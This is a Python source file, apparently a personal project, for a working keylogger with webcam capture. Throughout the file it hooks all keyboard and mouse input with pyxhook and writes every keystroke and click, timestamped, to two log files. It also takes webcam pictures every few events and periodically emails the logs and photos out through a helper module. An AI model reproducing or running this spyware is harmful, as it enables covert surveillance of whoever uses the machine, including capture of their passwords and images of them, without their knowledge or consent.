import sendmail_attach
import take_picture
import time
import pyxhook


log_path = '/home/dean/projects/git-tutorial/camera/log/'
YMD = time.strftime('%Y%m%d',time.localtime(time.time()))
log_path = log_path + YMD
take_picture.mkdir(log_path)
fd = open(log_path + '/file.log', 'a+')


log_path_re = '/home/dean/projects/git-tutorial/camera/'
fd2 = open(log_path_re + 'file.log', 'a+')

pic_num = 0

#The file will automatically appear on the desktop. You may want to edit the location!

def OnKeyPress(event):
	# use to record in local
	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd.write('\n')
	fd.write(event.Key)
	fd.write('\n')
	
	# use to send email
	fd2.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd2.write('\n')
	fd2.write(event.Key)
	fd2.write('\n')
	
	global pic_num
	pic_num = pic_num + 1
	# use to send email
	if pic_num % 5 == 0:
		take_picture.take_pic()
		
	# use to record in local
	if pic_num % 2 == 0:	
		take_picture.take_pic_t()
		
	# send an email
	if pic_num % 10 == 0:
		sendmail_attach.send_email()
	
def OnMousePress(event):
	# use to record in local
	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd.write('\n')
	fd.write(str(event))
	fd.write('\n')
	
	# use to send email
	fd2.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd2.write('\n')
	fd2.write(str(event))
	fd2.write('\n')
	
	global pic_num
	pic_num = pic_num + 1
	# use to send email
	if pic_num % 50 == 0:
		take_picture.take_pic()
		
	# use to record in local	
	if pic_num % 2 == 0:	
		take_picture.take_pic_t()
	
	# send an email
	if pic_num % 50 == 0:
		sendmail_attach.send_email()


################################################################################


if __name__ == '__main__':

	new_hook = pyxhook.HookManager()
	new_hook.KeyDown = OnKeyPress
	new_hook.HookKeyboard()
	new_hook.MouseAllButtonsDown = OnMousePress
	new_hook.HookMouse()
	new_hook.start()
	
	take_picture.take_pic_t()
	
	n = 30
	while(1):
		pass
		# sendmail_attach.send_email()
		# time.sleep(60 * n)
		# n = n + 5


